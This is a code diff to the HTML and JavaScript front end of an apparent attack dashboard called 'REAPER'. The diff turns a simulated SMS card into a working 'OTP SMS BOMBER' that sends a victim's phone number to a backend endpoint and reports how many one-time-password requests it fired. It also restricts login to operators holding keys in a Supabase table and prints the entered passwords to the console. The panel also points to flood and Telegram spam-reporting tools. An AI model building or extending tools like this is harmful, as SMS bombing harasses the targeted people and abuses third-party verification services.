@@ -511,22 +511,16 @@
     <div id="auth-gate">
         <div class="auth-card">
             <div class="auth-tabs">
-                <div class="auth-tab active" onclick="switchAuth('login')">LOGIN</div>
-                <div class="auth-tab" onclick="switchAuth('register')">REGISTER</div>
+                <div class="auth-tab active">OPERATOR AUTHENTICATION</div>
             </div>
             <div class="auth-body">
                 <div id="auth-login">
                     <h2 style="font-weight:900; letter-spacing:8px; margin-bottom:2rem; font-size:1.2rem;">REAPER LOGIN
                     </h2>
-                    <input type="text" id="login-user" placeholder="OPERATOR ID"><input type="password" id="login-pass"
-                        placeholder="ACCESS KEY"><button class="btn" onclick="handleLogin()">INITIALIZE</button>
+                    <input type="text" id="login-user" placeholder="OPERATOR ID">
+                    <input type="password" id="login-pass" placeholder="ACCESS KEY">
+                    <button class="btn" id="login-btn" onclick="handleLogin()">INITIALIZE</button>
                     <p id="login-error" style="color:var(--error); font-size:0.6rem; margin-top:1rem;"></p>
-                </div>
-                <div id="auth-register" class="hidden">
-                    <h2 style="font-weight:900; letter-spacing:8px; margin-bottom:2rem; font-size:1.2rem;">REAPER REG
-                    </h2>
-                    <input type="text" id="reg-user" placeholder="CHOOSE ID"><input type="password" id="reg-pass"
-                        placeholder="CHOOSE KEY"><button class="btn" onclick="handleRegister()">CREATE OPERATOR</button>
                 </div>
             </div>
         </div>
@@ -560,8 +554,8 @@
                     <div id="flood-results" class="results">...</div>
                 </div>
                 <div class="card">
-                    <h3>📱 GHOST SMS</h3><input type="text" id="sms-target" placeholder="MSISDN"><button class="btn"
-                        onclick="runSim('sms')">BROADCAST</button>
+                    <h3>📱 OTP SMS BOMBER</h3><input type="text" id="sms-target" placeholder="MSISDN (e.g. +1234567890)"><button class="btn" id="sms-btn"
+                        onclick="runSmsBomber()">BLAST OTP</button>
                     <div id="sms-results" class="results">...</div>
                 </div>
             </div>
@@ -812,23 +806,29 @@
 
         const _supaUrl = 'https://smxpzldbxewcgrakaqhn.supabase.co';
         const _supaKey = 'sb_publishable_QviDYLWIVjVJl4N01Bqaug_ZgkNHcde';
-        const supabase = window.supabase.createClient(_supaUrl, _supaKey);
+        const supabaseClient = supabase.createClient(_supaUrl, _supaKey);
 
         async function handleLogin() {
             const user = document.getElementById('login-user').value.trim();
-            if (!user) return;
+            const pass = document.getElementById('login-pass').value.trim();
+            if (!user || !pass) return;
             
             document.getElementById('login-btn').innerText = 'VERIFYING...';
             
             try {
-                const { data, error } = await supabase
+                const { data, error } = await supabaseClient
                     .from('keys')
-                    .select('status')
-                    .eq('key', user)
+                    .select('status, operator_id')
+                    .eq('key', pass)
                     .single();
+                    
+                console.log("Login Attempt:", { user, pass, data, error });
 
-                if (error || !data || data.status !== 'active') {
-                    throw new Error('INVALID KEY');
+                const normalizedUser = user.toLowerCase();
+                const normalizedDbUser = (data.operator_id || '').toLowerCase();
+
+                if (error || !data || data.status !== 'active' || normalizedDbUser !== normalizedUser) {
+                    throw new Error('INVALID KEY OR OPERATOR');
                 }
 
                 sessionStorage.setItem('logged', user); 
@@ -840,13 +840,20 @@
                 renderChangeLog(); 
                 renderTgAccounts();
             } catch (err) {
-                const input = document.getElementById('login-user');
-                input.value = '';
-                input.placeholder = '❌ INVALID OR EXPIRED KEY';
-                input.style.border = '1px solid var(--error)';
+                const userInput = document.getElementById('login-user');
+                const passInput = document.getElementById('login-pass');
+                userInput.value = '';
+                passInput.value = '';
+                userInput.placeholder = '❌ AUTH FAILED';
+                passInput.placeholder = '❌ INVALID CREDENTIALS';
+                userInput.style.border = '1px solid var(--error)';
+                passInput.style.border = '1px solid var(--error)';
+                
                 setTimeout(() => {
-                    input.placeholder = 'ENTER ACCESS KEY';
-                    input.style.border = '1px solid #333';
+                    userInput.placeholder = 'OPERATOR ID';
+                    passInput.placeholder = 'ACCESS KEY';
+                    userInput.style.border = '1px solid #333';
+                    passInput.style.border = '1px solid #333';
                     document.getElementById('login-btn').innerText = 'INITIALIZE';
                 }, 2000);
             }
@@ -956,6 +963,47 @@
         }
         function runSim(type) { document.getElementById(`${type}-results`).innerText = '> STATUS: 200 OK'; }
         function addLog(msg) { const stream = document.getElementById('log-stream'); stream.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>` + stream.innerHTML; }
+
+        async function runSmsBomber() {
+            const target = document.getElementById('sms-target').value.trim();
+            const res = document.getElementById('sms-results');
+            const btn = document.getElementById('sms-btn');
+            
+            if (!target) {
+                res.innerText = 'ERROR: MSISDN REQUIRED';
+                return;
+            }
+            
+            btn.innerText = 'BOMBING...';
+            btn.disabled = true;
+            res.innerText = 'INITIALIZING ASYNC OTP FLOOD...\nRESOLVING VULNERABLE ENDPOINTS...\n[+] FIRING BATCH 1...\n';
+            
+            try {
+                const response = await fetch('/api/sms_bomber', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ target: target })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    res.innerText += `\n[STATUS] ${data.message}\n`;
+                    res.innerText += `[SUCCESS] Fired ${data.requests_fired} total requests.\n`;
+                    res.innerText += `[HITS] ${data.successful_hits} APIs successfully responded.\n`;
+                } else {
+                    res.innerText += `\n[ERROR] Operation failed: ${data.error || 'Unknown server error'}\n`;
+                }
+            } catch (err) {
+                res.innerText += `\n[ERROR] Connection to OTP Engine failed.\n`;
+                console.error(err);
+            } finally {
+                btn.innerText = 'BLAST OTP';
+                btn.disabled = false;
+            }
+        }
 
         // ── TG OPS ──
         let selectedReason = 'spam';
